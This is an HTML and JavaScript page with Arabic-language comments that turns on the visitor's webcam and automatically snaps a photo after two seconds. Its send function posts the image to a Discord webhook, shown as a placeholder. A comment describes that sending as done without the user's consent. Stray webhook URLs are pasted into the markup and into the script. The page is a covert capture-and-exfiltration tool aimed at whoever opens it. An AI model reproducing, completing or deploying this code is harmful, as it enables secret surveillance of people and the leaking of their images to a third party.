
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Camera Auto Snap</title>
</head>
<body>

<h2>📸 Camera</h2>

<video id="video" width="300" autoplay></video>
<br><br>

<button onclick="sendPhoto()">📤 إرسال الصورة</button>
https://discord.com/api/webhooks/XXXX
<br><br>
<img id="photo" width="300"/>

<script>
let video = document.getElementById("video");
let imageData = "";

// تشغيل الكاميرا
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
  video.srcObject = stream;

  // 📸 تصوير تلقائي بعد 2 ثواني
  setTimeout(() => {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    imageData = canvas.toDataURL("image/png");
    document.getElementById("photo").src = imageData;

  }, 2000);
})
.catch(() => {
  alert("خاصك تسمح بالكاميرا");
});

// 📤 إرسال الصورة (بدوننن موافقة المستخدم)
function sendPhoto() {
  if (!imageData) {
    alert("توجد صورة 📸");
    return;
  }https://discord.com/api/webhooks/XXXX

  fetch("YOUR_WEBHOOK_URL", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content: "📸 صورة جديدة",
      embeds: [{ image: { url: imageData } }]
    })
  })
  .then(() => alert("تصيفطات الصورة ✅"))
  .catch(() => alert("خطأ ❌"));
}
</script>

</body>
</html>
https://discord.com/api/webhooks/XXXX
